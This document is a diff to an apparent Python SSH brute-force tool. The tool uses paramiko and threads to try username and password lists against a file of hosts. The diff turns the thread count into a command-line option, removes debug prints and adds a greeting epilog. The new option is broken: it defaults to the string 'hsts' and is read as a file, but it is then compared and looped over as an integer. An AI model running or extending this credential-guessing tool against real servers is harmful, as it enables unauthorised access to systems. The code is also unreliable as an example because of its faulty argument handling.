@@ -5,15 +5,14 @@ from Queue import Queue
 from threading import Thread
 
 
-THREADNUM = 4
-
-
-parser = argparse.ArgumentParser(description='Bruteforce ssh by list of passwords and usernames')
+parser = argparse.ArgumentParser(description='Bruteforce ssh by list of passwords and usernames',
+                                 epilog="Hello PowerLifter")
 parser.add_argument('-i', type=int, default=30, help='interval between connections(default: 30 sec)')
 parser.add_argument('-p', type=int, default=22, help='port to connect to(default: 22)')
 parser.add_argument('--usernames', default="srnms", type=argparse.FileType("r"), help='file with usernames(default: srnms)')
 parser.add_argument('--passwords', default="pswds", type=argparse.FileType("r"), help='file with passwords(default: pswds)')
 parser.add_argument('--hosts', default="hsts", type=argparse.FileType("r"), help='file with hosts to connect to(default: hsts)')
+parser.add_argument('--threadnum', default="hsts", type=argparse.FileType("r"), help='number of threads(default: 4)')
 
 args = parser.parse_args()
 users = []
@@ -24,7 +23,6 @@ combos = []
 def worker(queue):
     while True:
         host = queue.get()
-        print host
         for user, pwd in combos:
             try:
                 ssh = paramiko.SSHClient()
@@ -57,14 +55,11 @@ def main():
     global combos
     combos = [combo for combo in itertools.product(users, passwords)]
 
-    print combos
-
     # go threads
-    global THREADNUM
-    if len(combos) < THREADNUM:
-        THREADNUM = len(combos)
+    if len(combos) < args.threadnum:
+        args.threadnum = len(combos)
 
-    for i in range(THREADNUM):
+    for i in range(args.threadnum):
         t = Thread(target=worker, args=(queue,))
         t.daemon = True
         t.start()
